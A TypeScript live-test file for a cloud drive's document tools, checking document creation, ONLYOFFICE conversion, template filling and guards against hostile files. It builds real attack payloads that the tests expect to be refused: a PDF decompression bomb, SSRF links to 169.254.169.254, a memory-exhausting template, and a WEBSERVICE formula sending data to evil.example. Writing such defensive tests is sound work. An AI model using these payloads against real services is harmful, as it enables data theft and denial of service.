/**
 * Lane C live cases (DESIGN 17.6) against drive.nourax.org through local wrangler dev, as the QA
 * account qa-t1-c-documents-1. Everything happens inside one /MCP-QA-<run>-docs folder, which is
 * moved to that account's trash at the end (the rule-3 exception: our own test objects only).
 *
 * Covered: every lane C tool for real; docx, xlsx and pptx made in the Worker, then converted by
 * ONLYOFFICE to PDF (proof that ONLYOFFICE reads them) and to odt/ods/odp (read back by our
 * OpenDocument readers: real-producer files); a legacy RTF read through the connector's conversion;
 * a template filled and converted; xlsx to csv (which sheets the converter keeps); a 30-page PDF read
 * with its timing; the ONLYOFFICE request shape (no Accept header); a brand scan of every output.
 * NX_LIVE_SAVE_DIR, when set, receives the ONLYOFFICE-made files for unit-test fixtures.
 *
 * Hostile test files (a PDF bomb, damaged or fake packages, an SSRF probe, a template built to use
 * up memory) go only into the .noindex folder HOSTILE and are deleted for good right after their
 * check, also when it fails (client.ts withHostile and purgedAfter); afterAll purges that folder
 * too and fails the run if any purge went wrong.
 */
import { mkdirSync, writeFileSync } from "node:fs";
import { join } from "node:path";
import { unzipSync, zipSync, zlibSync } from "fflate";
import { afterAll, beforeAll, describe, expect, it } from "vitest";
import { data, dav, FOLDER, HOSTILE, makeHostileFolder, payload, purge, purgedAfter, purgeLog, rpc, tool, UID, withHostile } from "./client";

const P = (name: string) => `${FOLDER}/${name}`;
const timings: Record<string, number> = {};
const findings: Record<string, unknown> = {};

async function save(name: string): Promise<void> {
	const dir = process.env.NX_LIVE_SAVE_DIR;
	if (!dir) return;
	const res = await dav("GET", P(name));
	if (!res.ok) throw new Error(`download ${name}: ${res.status}`);
	mkdirSync(dir, { recursive: true });
	writeFileSync(join(dir, name), new Uint8Array(await res.arrayBuffer()));
}

const H = (name: string) => `${HOSTILE}/${name}`;

beforeAll(async () => {
	const res = await dav("MKCOL", FOLDER);
	expect(res.status, `MKCOL ${FOLDER}`).toBe(201);
	await makeHostileFolder();
});

afterAll(async () => {
	let res: Response | null = null;
	try {
		// Whatever is left in the hostile folder (nothing, unless a purge failed) goes for good.
		const h = await purge(HOSTILE);
		findings.hostile_folder_purged = h.purged;
		if (h.problem) purgeLog.problems.push(`${HOSTILE}: ${h.problem}`);
	} finally {
		// Our own test folder goes to the QA account's trash (DAV DELETE with the trash app on).
		res = await dav("DELETE", FOLDER);
	}
	findings.hostile_files = { uploaded: purgeLog.uploaded, trash_entries_purged: purgeLog.purged, problems: purgeLog.problems };
	findings.trashed_folder_status = res.status;
	// Vitest hides console output of passing tests, so the numbers go to a file as well.
	const dir = process.env.NX_LIVE_SAVE_DIR;
	if (dir) {
		mkdirSync(dir, { recursive: true });
		writeFileSync(join(dir, "live-results.json"), JSON.stringify({ uid: UID, folder: FOLDER, timings_ms: timings, findings }, null, 2));
	}
	console.log(`lane C live timings (ms): ${JSON.stringify(timings)}`);
	expect(purgeLog.problems).toEqual([]);
	expect([204, 404]).toContain(res.status);
});

const MD = `# Quarterly plan

Written for **{{client}}** on {{date}}. See [Nourax](https://nourax.org).

## Goals

1. Grow revenue
2. Hire two people
   - one engineer

| Item | Cost |
|------|-----:|
| Tea  | 2.50 |
| Cake | 4.00 |

> Keep it simple.

<!-- pagebreak -->

## Next steps

- Write the report
- Share it`;

describe(`live: documents as ${UID}`, () => {
	it("docs_create_document, read back, list template fields", async () => {
		const r = await tool("docs_create_document", { path: P("plan.docx"), markdown: MD, title: "Plan" });
		expect(data(r)).toMatchObject({ renamed: false, file: { path: P("plan.docx"), type: "file" } });
		timings.create_docx = r.ms;
		const t = await tool("files_read_text", { path: P("plan.docx") });
		expect(data(t)).toMatchObject({ format: "docx", truncated: false });
		const text = payload(t);
		expect(text).toContain("# Quarterly plan");
		expect(text).toContain("1. Grow revenue\n2. Hire two people\n  - one engineer");
		expect(text).toContain("| Tea | 2.50 |");
		expect(text).toContain("[Nourax](https://nourax.org)");
		const f = await tool("docs_list_template_fields", { path: P("plan.docx") });
		expect(data(f).fields).toEqual([
			{ name: "client", count: 1 },
			{ name: "date", count: 1 },
		]);
		// The same name again: fail, then rename.
		expect((await tool("docs_create_document", { path: P("plan.docx"), markdown: "x" }))._meta?.["nourax/error"]?.code).toBe("already_exists");
		expect(data(await tool("docs_create_document", { path: P("plan.docx"), markdown: "x", if_exists: "rename" }))).toMatchObject({ renamed: true, file: { path: P("plan (2).docx") } });
	});

	it("docs_create_spreadsheet and docs_create_presentation, read back", async () => {
		const s = await tool("docs_create_spreadsheet", {
			path: P("budget.xlsx"),
			sheets: [
				{ name: "Costs", columns: [{ header: "Item" }, { header: "When", type: "date" }, { header: "Cost", type: "currency" }, { header: "Share", type: "percent" }, { header: "Double", type: "formula" }], rows: [["Tea", "2026-10-25", 2.5, 0.25, "=C2*2"], ["=not a formula", "2026-10-26T09:30", 4, "50%", "=C3*2"]] },
				{ name: "Notes", rows: [["Note"], ["second sheet text"]] },
			],
		});
		expect(data(s).sheets).toEqual([
			{ name: "Costs", rows: 2, columns: 5 },
			{ name: "Notes", rows: 1, columns: 1 },
		]);
		const st = payload(await tool("files_read_text", { path: P("budget.xlsx") }));
		expect(st).toContain("## Sheet: Costs\nItem,When,Cost,Share,Double\nTea,2026-10-25,2.5,0.25,=C2*2\n=not a formula,2026-10-26 09:30,4,0.5,=C3*2");
		expect(st).toContain("## Sheet: Notes\nNote\nsecond sheet text");
		const p = await tool("docs_create_presentation", {
			path: P("deck.pptx"),
			slides: [
				{ title: "Quarterly plan", layout: "title", body: "October 2026" },
				{ title: "Goals", bullets: ["Grow", { text: "Revenue", level: 2 }, "Hire"], notes: "Mention the budget" },
				{ title: "Thanks", layout: "section" },
			],
		});
		expect(data(p)).toMatchObject({ slides: 3 });
		expect(payload(await tool("files_read_text", { path: P("deck.pptx") }))).toBe("## Slide 1: Quarterly plan\n\nOctober 2026\n\n## Slide 2: Goals\n\nGrow\n  Revenue\nHire\n\nNotes: Mention the budget\n\n## Slide 3: Thanks");
	});

	it("ONLYOFFICE converts our docx, xlsx and pptx to PDF, and we read the PDFs back", async () => {
		for (const [src, needle] of [
			["plan.docx", "Quarterly plan"],
			["budget.xlsx", "Tea"],
			["deck.pptx", "Goals"],
		] as const) {
			const r = await tool("docs_convert", { path: P(src) });
			const out = data(r) as { file: { path: string; mime: string } };
			expect(out.file.path).toBe(P(src.replace(/\.\w+$/, ".pdf")));
			timings[`convert_${src}`] = r.ms;
			const head = await dav("GET", out.file.path, undefined, { range: "bytes=0-4" });
			expect(new TextDecoder().decode(await head.arrayBuffer())).toBe("%PDF-");
			const t = await tool("files_read_text", { path: out.file.path });
			expect(data(t)).toMatchObject({ format: "pdf" });
			expect(payload(t)).toContain(needle);
			await save(src.replace(/\.\w+$/, ".pdf"));
		}
	});

	it("ONLYOFFICE makes odt, ods and odp from them, and our OpenDocument readers read those", async () => {
		const cases = [
			["plan.docx", "odt", "# Quarterly plan"],
			["budget.xlsx", "ods", "## Sheet: Costs"],
			["deck.pptx", "odp", "## Slide 2: Goals"],
		] as const;
		for (const [src, to, needle] of cases) {
			const r = await tool("docs_convert", { path: P(src), to });
			const out = (data(r) as { file: { path: string } }).file.path;
			await save(out.slice(out.lastIndexOf("/") + 1));
			const t = await tool("files_read_text", { path: out });
			expect(data(t)).toMatchObject({ format: to });
			expect(payload(t), `${to} text`).toContain(needle);
		}
	});

	it("xlsx to csv: what the converter keeps", async () => {
		const r = await tool("docs_convert", { path: P("budget.xlsx"), to: "csv" });
		const t = payload(await tool("files_read_text", { path: (data(r) as { file: { path: string } }).file.path }));
		expect(t).toContain("Tea");
		// Recorded for DESIGN 23 (lane C): does the CSV hold the second sheet?
		findings.xlsx_to_csv_keeps_second_sheet = t.includes("second sheet text");
		findings.xlsx_to_csv_text = t.slice(0, 300);
	});

	it("a legacy RTF is read through the connector's conversion", async () => {
		const put = await dav("PUT", P("old.rtf"), "{\\rtf1\\ansi\\deff0 {\\fonttbl {\\f0 Arial;}}\\f0\\fs24 Hello from {\\b legacy} RTF.\\par Second paragraph.\\par}", { "content-type": "application/rtf" });
		expect(put.status).toBe(201);
		const t = await tool("files_read_text", { path: P("old.rtf") });
		expect(data(t)).toMatchObject({ format: "rtf", note: "Read through a conversion to plain text; some spacing may be lost. Accented letters in RTF files may be lost in this conversion." });
		expect(payload(t)).toContain("Hello from legacy RTF.");
		expect(payload(t)).toContain("Second paragraph.");
	});

	it("docs_fill_template, then the filled file converts to PDF", async () => {
		const r = await tool("docs_fill_template", { template_path: P("plan.docx"), output_path: P("plan-acme.docx"), values: { client: "Acme & Co <Ltd>", date: "25 October 2026", spare: "x" } });
		expect(data(r)).toMatchObject({ filled: ["client", "date"], missing: [], unused: ["spare"] });
		expect(payload(await tool("files_read_text", { path: P("plan-acme.docx") }))).toContain("Written for Acme & Co <Ltd> on 25 October 2026.");
		const missing = await tool("docs_fill_template", { template_path: P("plan.docx"), output_path: P("plan-x.docx"), values: { client: "x" } });
		expect(missing._meta?.["nourax/error"]?.code).toBe("invalid_input");
		const pdf = await tool("docs_convert", { path: P("plan-acme.docx") });
		expect(payload(await tool("files_read_text", { path: (data(pdf) as { file: { path: string } }).file.path }))).toContain("Acme & Co <Ltd>");
	});

	it("a 30-page document converted to PDF and read back (timings)", async () => {
		let md = "";
		for (let i = 1; i <= 30; i++) md += `# Page ${i}\n\n${"This is a line of body text for the timing run. ".repeat(20)}\n\n<!-- pagebreak -->\n\n`;
		await tool("docs_create_document", { path: P("thirty.docx"), markdown: md });
		const w = await tool("docs_create_document", { path: P("thirty-b.docx"), markdown: md });
		timings.create_docx_30_pages = w.ms;
		const c = await tool("docs_convert", { path: P("thirty.docx") });
		timings.convert_30_pages = c.ms;
		const r = await tool("files_read_text", { path: P("thirty.pdf"), max_chars: 50_000 });
		timings.read_pdf_30_pages = r.ms;
		const d = data(r) as { pages: { total: number }; total_chars: number };
		expect(d.pages.total).toBeGreaterThanOrEqual(30);
		expect(payload(r)).toContain("## Page 30");
		const part = await tool("files_read_text", { path: P("thirty.pdf"), pages: "29-30" });
		expect((data(part) as { pages: unknown }).pages).toEqual({ from: 29, to: 30, total: d.pages.total });
		await save("thirty.pdf");
	});

	it("the ONLYOFFICE request shape (no Accept header) works, and refusals are plain", async () => {
		const r = await tool("files_read_text", { path: P("deck.pptx") }, { accept: "" });
		expect(data(r)).toMatchObject({ format: "pptx" });
		// Only a PNG signature, no image: a malformed file, so it goes in the trap.
		await withHostile("pixel.png", new Uint8Array([137, 80, 78, 71, 13, 10, 26, 10]), "image/png", async (png) => {
			const i = await tool("files_read_text", { path: png });
			expect(i.content[0]?.text).toBe("Images have no text to read.");
			const bad = await tool("docs_convert", { path: png });
			expect(bad._meta?.["nourax/error"]?.code).toBe("unsupported_type");
		});
		const outside = await tool("files_read_text", { path: "/../qa-t1-24/x.txt" });
		expect(outside._meta?.["nourax/error"]?.code).toBe("invalid_input");
	});

	// Fix round 1 (2026-10-25): the guards against hostile and mislabelled files, for real.
	it("fix round 1: docs_convert checks before converting; HTML sources and damaged or fake Office files are refused", async () => {
		// plan.pdf exists from the conversion case above: if_exists "fail" fails at once, without a conversion.
		const taken = await tool("docs_convert", { path: P("plan.docx"), if_exists: "fail" });
		expect(taken._meta?.["nourax/error"]?.code).toBe("already_exists");
		timings.convert_fail_taken_name = taken.ms;
		// An SSRF probe, a damaged package and a fake one: each in the trap, purged right after.
		await withHostile("page.html", '<html><body><img src="http://169.254.169.254/x">Hi</body></html>', "text/html", async (page) => {
			expect((await tool("docs_convert", { path: page })).content[0]?.text).toBe(".html files can't be converted here.");
		});
		await withHostile("broken.docx", new Uint8Array([0x50, 0x4b, 0x03, 0x04, ...Array.from({ length: 60 }, (_, i) => i)]), "application/octet-stream", async (broken) => {
			const b = await tool("docs_convert", { path: broken });
			expect(b.content[0]?.text).toBe(`${broken} couldn't be converted: it may be damaged, or not really a .docx file.`);
			timings.convert_refused_damaged = b.ms;
			expect((await tool("files_read_text", { path: broken }))._meta?.["nourax/error"]?.code).toBe("unsupported_type");
		});
		await withHostile("fake.docx", "This is really just text.", "application/octet-stream", async (fake) => {
			const f = await tool("files_read_text", { path: fake });
			expect(data(f)).toMatchObject({ format: "text", note: "This file is named .docx but holds plain text, so it was read as text." });
			expect(payload(f)).toBe("This is really just text.");
			expect((await tool("docs_convert", { path: fake }))._meta?.["nourax/error"]?.code).toBe("unsupported_type");
		});
	});

	it("fix round 1: text that isn't UTF-8, bounded template results, and a PDF bomb", async () => {
		expect((await dav("PUT", P("latin1.csv"), new Uint8Array([0x63, 0x61, 0x66, 0xe9, 0x2c, 0x31]), { "content-type": "text/csv" })).status).toBe(201);
		const l = await tool("files_read_text", { path: P("latin1.csv") });
		expect(payload(l)).toBe("café,1");
		expect(data(l).note).toContain("Windows-1252");
		// A template with 3,000 fields: 500 listed (fitted to one result), all counted; missing cut to 200.
		const W = 'xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"';
		const body = Array.from({ length: 3_000 }, (_, i) => `<w:p><w:r><w:t>{{field ${i}}}</w:t></w:r></w:p>`).join("");
		const enc = new TextEncoder();
		const tpl = zipSync({ "[Content_Types].xml": enc.encode('<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Default Extension="xml" ContentType="application/xml"/><Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/></Types>'), "_rels/.rels": enc.encode('<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/></Relationships>'), "word/document.xml": enc.encode(`<?xml version="1.0"?><w:document ${W}><w:body>${body}</w:body></w:document>`) });
		expect((await dav("PUT", P("many.docx"), tpl, { "content-type": "application/vnd.openxmlformats-officedocument.wordprocessingml.document" })).status).toBe(201);
		const list = await tool("docs_list_template_fields", { path: P("many.docx") });
		expect(data(list)).toMatchObject({ total_fields: 3_000, truncated: true });
		expect((data(list).fields as unknown[]).length).toBe(500);
		expect(list.content[0]?.text.length).toBeLessThanOrEqual(60_000);
		const fill = await tool("docs_fill_template", { template_path: P("many.docx"), output_path: P("many-out.docx"), values: { "field 1": "one" }, missing: "keep" });
		expect(data(fill)).toMatchObject({ missing_total: 2_999, truncated: true });
		expect((data(fill).missing as unknown[]).length).toBe(200);
		// The streamed output (parts copied packed, the edited part deflated as written) converts too.
		const pdf = await tool("docs_convert", { path: P("many-out.docx") });
		expect(data(pdf)).toMatchObject({ file: { path: P("many-out.pdf") } });
		// A 154 KB-class PDF whose content inflates to 40 MB of spaces: refused by the check.
		const content = new Uint8Array(40 * 1024 * 1024).fill(32);
		content.set(enc.encode("BT /F1 12 Tf 72 720 Td (Hello) Tj ET\n"), 0);
		const z = zlibSync(content, { level: 9 });
		const head = [
			"%PDF-1.4",
			"1 0 obj",
			"<< /Type /Catalog /Pages 2 0 R >>",
			"endobj",
			"2 0 obj",
			"<< /Type /Pages /Kids [3 0 R] /Count 1 >>",
			"endobj",
			"3 0 obj",
			"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R >>",
			"endobj",
			"4 0 obj",
			`<< /Length ${z.length} /Filter /FlateDecode >>`,
			"stream",
			"",
		].join("\n");
		const tail = "\nendstream\nendobj\ntrailer\n<< /Root 1 0 R >>\n%%EOF\n";
		const bomb = new Uint8Array(head.length + z.length + tail.length);
		bomb.set(enc.encode(head), 0);
		bomb.set(z, head.length);
		bomb.set(enc.encode(tail), head.length + z.length);
		// The bomb lives only in the .noindex folder, and only for the length of this check.
		await withHostile("bomb.pdf", bomb, "application/pdf", async (path) => {
			const r = await tool("files_read_text", { path });
			expect(r._meta?.["nourax/error"]?.code).toBe("too_large");
			expect(r.content[0]?.text).toBe("This PDF unpacks to far more than its size (more than 200 times), so it isn't read here.");
			timings.read_pdf_bomb_refused = r.ms;
		});
		findings.pdf_bomb_bytes = bomb.length;
	});

	// Fix round 2 (2026-10-25).
	it("fix round 2: Markdown becomes .docx in the Worker (never sent to the converter); md to pdf says how", async () => {
		const md = "# Plan\n\n![probe](http://app/status.php)\n\n- one\n- [bad](javascript:alert(1))\n\n1. first\n2. second";
		await withHostile(
			"probe.md",
			md,
			"text/markdown",
			async (src) => {
				const r = await tool("docs_convert", { path: src, to: "docx" });
				expect(data(r)).toMatchObject({ from: src, file: { path: H("probe.docx") } });
				timings.convert_md_docx_in_worker = r.ms;
				const t = payload(await tool("files_read_text", { path: H("probe.docx") }));
				expect(t).toContain("# Plan");
				expect(t).toContain("- one");
				expect(t).toContain("1. first");
				const dl = await dav("GET", H("probe.docx"));
				const parts = unzipSync(new Uint8Array(await dl.arrayBuffer()));
				expect(Object.keys(parts).some((k) => k.startsWith("word/media/"))).toBe(false);
				expect(new TextDecoder().decode(parts["word/_rels/document.xml.rels"])).not.toMatch(/status\.php|javascript:/);
				const pdf = await tool("docs_convert", { path: src });
				expect(pdf._meta?.["nourax/error"]?.code).toBe("unsupported_type");
				expect(pdf.content[0]?.text).toBe('A .md file can become a .docx here (to "docx"), and that .docx can then be converted to .pdf.');
				timings.convert_md_pdf_refused = pdf.ms;
			},
			["probe.docx"],
		);
	});

	it("fix round 2: a missing output folder is found before a conversion is spent, and named", async () => {
		const c = await tool("docs_convert", { path: P("plan.docx"), output_path: P("nowhere/plan.pdf") });
		expect(c._meta?.["nourax/error"]?.code).toBe("parent_missing");
		expect(c.content[0]?.text).toBe(`The folder ${P("nowhere")} doesn't exist. files_create_folder can make it.`);
		timings.convert_missing_folder = c.ms;
		const d = await tool("docs_create_document", { path: P("nowhere/x.docx"), markdown: "x" });
		expect(d.content[0]?.text).toBe(`The folder ${P("nowhere")} doesn't exist. files_create_folder can make it.`);
		// A taken name: the document tools' own hint.
		const taken = await tool("docs_create_document", { path: P("plan.docx"), markdown: "x" });
		expect(taken.content[0]?.text).toBe(`${P("plan.docx")} already exists. Use if_exists "rename", or another path.`);
	});

	it("fix round 2: a two-sheet workbook made into a PDF warns that only the first sheet is in it (checked in the PDF)", async () => {
		const s = await tool("docs_create_spreadsheet", {
			path: P("two.xlsx"),
			sheets: [
				{ name: "First", rows: [["Item"], ["first-sheet-text"]] },
				{ name: "Second", rows: [["Ref"], ["second-sheet-text"]] },
			],
		});
		expect(data(s).sheets).toHaveLength(2);
		const r = await tool("docs_convert", { path: P("two.xlsx") });
		const out = data(r) as { file: { path: string }; warnings?: string[] };
		expect(out.warnings).toEqual(["Only the first sheet was converted: this workbook has 2 sheets, so 1 isn't in the PDF file. The ONLYOFFICE editor can export every sheet."]);
		timings.convert_two_sheets_pdf = r.ms;
		const text = payload(await tool("files_read_text", { path: out.file.path }));
		expect(text).toContain("first-sheet-text");
		findings.xlsx_to_pdf_keeps_second_sheet = text.includes("second-sheet-text");
	});

	it("fix round 2: TRUE survives an ONLYOFFICE-made .ods (booleans saved as 1)", async () => {
		await tool("docs_create_spreadsheet", { path: P("bools.xlsx"), sheets: [{ rows: [["Name", "Done"], ["a", true], ["b", false]] }] });
		const r = await tool("docs_convert", { path: P("bools.xlsx"), to: "ods" });
		const ods = (data(r) as { file: { path: string } }).file.path;
		const dl = await dav("GET", ods);
		const content = new TextDecoder().decode(unzipSync(new Uint8Array(await dl.arrayBuffer()))["content.xml"]);
		findings.ods_boolean_values = [...new Set([...content.matchAll(/office:boolean-value="([^"]*)"/g)].map((m) => m[1]))];
		expect(payload(await tool("files_read_text", { path: ods }))).toContain("Name,Done\na,TRUE\nb,FALSE");
		await save(ods.slice(ods.lastIndexOf("/") + 1));
	});

	it("fix round 2: the stacked-prefix formula is refused; limits are in the published schemas; lists are counted", async () => {
		const f = await tool("docs_create_spreadsheet", { path: P("f.xlsx"), sheets: [{ columns: [{ header: "F", type: "formula" }], rows: [['=_xlfn._xlws.WEBSERVICE("http://a")']] }] });
		expect(f._meta?.["nourax/error"]?.code).toBe("invalid_input");
		expect(f.content[0]?.text).toContain("reaches outside the spreadsheet");
		const list = (await rpc("tools/list", {})) as { tools: { name: string; description: string; inputSchema: { properties: Record<string, Record<string, unknown>> } }[] };
		expect(list.tools.find((x) => x.name === "docs_fill_template")?.inputSchema.properties.values?.maxProperties).toBe(200);
		expect(list.tools.find((x) => x.name === "docs_convert")?.description).toContain("A workbook made into PDF or CSV keeps only its first sheet.");
		const summary = await tool("docs_create_document", { path: P("lists.docx"), markdown: "- a\n- b\n\n1. one\n2. two" });
		expect(summary.content[0]?.text.split("\n")[0]).toMatch(/; 0 headings, 0 tables, 2 lists\)\.$/);
	});

	it("fix round 2: a template of 10,000 {{a}} filled with 10,000 '&' is refused at once, and the Worker carries on", async () => {
		// The security review's case: once it ran the isolate out of memory. Made through our own tool,
		// so it is exactly what an AI caller could make; it is a hostile file, so it goes in the trap.
		// 10,000 paragraphs keep document.xml under 1 MB, so the zip guard's 100-times check (which
		// refused the 20,000-paragraph version outright, seen in the first run) lets it through to
		// the fill, whose sizing is what this checks.
		await purgedAfter(["bomb-template.docx", "bomb-filled.docx"], async () => {
			const made = await tool("docs_create_document", { path: H("bomb-template.docx"), markdown: "{{a}}\n\n".repeat(10_000) });
			expect(data(made)).toMatchObject({ file: { path: H("bomb-template.docx") } });
			const r = await tool("docs_fill_template", { template_path: H("bomb-template.docx"), output_path: H("bomb-filled.docx"), values: { a: "&".repeat(10_000) } });
			expect(r._meta?.["nourax/error"]?.code).toBe("too_large");
			expect(r.content[0]?.text).toBe("The filled file would be too big (an edited part over 12,000,000 characters). Use shorter values or fewer placeholders.");
			timings.fill_template_bomb_refused = r.ms;
			// The same Worker answers the next call normally, on the same template.
			const next = await tool("docs_list_template_fields", { path: H("bomb-template.docx") });
			expect(data(next)).toMatchObject({ fields: [{ name: "a", count: 10_000 }], total_fields: 1 });
			timings.next_call_after_bomb = next.ms;
			expect((await dav("GET", H("bomb-filled.docx"))).status).toBe(404);
		});
	});

	// Fix round 3 (2026-10-26).
	describe("fix round 3", () => {
		it("a Markdown of 200,000 short lines is made quickly (the parser is linear, not quadratic)", async () => {
			// Before the fix this took 13,335 ms through the dev Worker (reading the end of a growing
			// buffer on every newline); now it is linear. 400,000 characters, inside the limit.
			const r = await tool("docs_create_document", { path: P("many-lines.docx"), markdown: "a\n".repeat(200_000) });
			expect(data(r)).toMatchObject({ file: { path: P("many-lines.docx") } });
			timings.create_docx_many_lines = r.ms;
			expect(r.ms, `was ${r.ms} ms`).toBeLessThan(6_000);
		});

		it("a document of a repeated table is read back, not refused as a zip bomb", async () => {
			const md = `| Item | Qty | Note |\n|---|---|---|\n${"| Widget | 1 | ok |\n".repeat(3_000)}`;
			await tool("docs_create_document", { path: P("repeat.docx"), markdown: md });
			const t = await tool("files_read_text", { path: P("repeat.docx") });
			expect(data(t)).toMatchObject({ format: "docx" });
			expect(payload(t)).toContain("| Widget | 1 | ok |");
			timings.read_repetitive_docx = t.ms;
		});

		it("a spreadsheet whose sheet name hides WEBSERVICE behind a quote is refused, and no file is made", async () => {
			const r = await tool("docs_create_spreadsheet", {
				path: P("evil.xlsx"),
				sheets: [
					{ name: 'x"y', columns: [{ header: "F", type: "formula" }], rows: [[`='x"y'!A1&WEBSERVICE("https://evil.example/?d="&'p"q'!A2)`]] },
					{ name: 'p"q', rows: [["x"]] },
				],
			});
			expect(r._meta?.["nourax/error"]?.code).toBe("invalid_input");
			expect(r.content[0]?.text).toContain("reaches outside the spreadsheet");
			expect((await dav("GET", P("evil.xlsx"))).status).toBe(404);
		});

		it("the converter is never given HTML content or a package that links a file by URL (SSRF)", async () => {
			// A text file whose bytes are really HTML, pointed at a link-local address.
			await withHostile("sneaky.txt", "<html><body><img src=\"http://169.254.169.254/latest/meta-data/\">hi</body></html>", "text/plain", async (p) => {
				const r = await tool("docs_convert", { path: p });
				expect(r._meta?.["nourax/error"]?.code).toBe("unsupported_type");
				expect(r.content[0]?.text).toContain("web page (HTML)");
			});
			// A docx that links an image by an http URL: the converter would fetch it; we refuse first.
			const W = 'xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"';
			const REL = "http://schemas.openxmlformats.org/officeDocument/2006/relationships";
			const e = new TextEncoder();
			const linkedDocx = zipSync({
				"[Content_Types].xml": e.encode(
					'<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/><Default Extension="xml" ContentType="application/xml"/><Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/></Types>',
				),
				"_rels/.rels": e.encode('<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId0" Type="' + REL + '/officeDocument" Target="word/document.xml"/></Relationships>'),
				"word/document.xml": e.encode(`<?xml version="1.0"?><w:document ${W}><w:body><w:p><w:r><w:t>hi</w:t></w:r></w:p></w:body></w:document>`),
				"word/_rels/document.xml.rels": e.encode(`<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="${REL}/image" Target="http://169.254.169.254/x.png" TargetMode="External"/></Relationships>`),
			});
			await withHostile("linked.docx", linkedDocx, "application/vnd.openxmlformats-officedocument.wordprocessingml.document", async (p) => {
				const r = await tool("docs_convert", { path: p });
				expect(r._meta?.["nourax/error"]?.code).toBe("invalid_input");
				expect(r.content[0]?.text).toContain("links to an image or file on the internet");
			});
		});
	});
});
